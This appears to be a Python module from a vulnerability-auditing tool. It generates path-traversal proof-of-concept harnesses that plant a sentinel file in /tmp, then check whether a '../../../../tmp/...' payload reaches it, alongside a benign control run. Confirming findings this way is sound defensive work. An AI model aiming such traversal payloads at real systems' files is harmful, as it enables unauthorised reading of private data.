#!/usr/bin/env python3
from __future__ import annotations
"""Path-traversal PoC for sinks that read an attacker-controlled path."""

from deepaudit.core.repo_map import RepoModel
from deepaudit.core.source_adapters import SourceAdapter
from deepaudit.models.candidate import VulnerabilityCandidate
from deepaudit.templates.base import BaseTemplate


class PathTraversalReadTemplate(BaseTemplate):
    name = "path_traversal_read"
    exploit_class = "path_traversal"
    def sentinel_channels(self) -> list[str]:
        return ["stdout"]

    def environmental_preconditions(self, candidate, env) -> bool:
        return env.writable_tmp

    def _payload(self, candidate: VulnerabilityCandidate, sentinel: str, is_exploit: bool, sentinel_id: str) -> str:
        if is_exploit:
            return f"../../../../tmp/sentinel-target-{sentinel_id}"
        return "normal_file.txt"

    def _sentinel_path(self, sentinel_id: str) -> str:
        return f"/tmp/sentinel-target-{sentinel_id}"

    def generate_exploit(self, candidate, sentinel, adapter: SourceAdapter, repo_model: RepoModel) -> str:
        sid = candidate.id[:8]
        payload = self._payload(candidate, sentinel, True, sid)
        target_path = self._sentinel_path(sid)
        setup = adapter.generate_setup(candidate.source, sentinel, True, candidate, payload)
        invocation = adapter.generate_invocation(candidate.source, sentinel, True, candidate, payload)
        return f"""{setup}
import sys
sys.path.insert(0, "/repo")

with open({target_path!r}, "w") as _f:
    _f.write({sentinel!r})

import {candidate.source_module}

{invocation}

if {sentinel!r} in str(result):
    print({sentinel!r})

print("__HARNESS_DONE__")
"""

    def generate_control(self, candidate, sentinel, adapter: SourceAdapter, repo_model: RepoModel) -> str:
        sid = candidate.id[:8]
        payload = self._payload(candidate, sentinel, False, sid)
        setup = adapter.generate_setup(candidate.source, sentinel, False, candidate, payload)
        invocation = adapter.generate_invocation(candidate.source, sentinel, False, candidate, payload)
        return f"""{setup}
import sys
sys.path.insert(0, "/repo")

import {candidate.source_module}

try:
    {invocation}
except Exception:
    pass

print("__HARNESS_DONE__")
"""
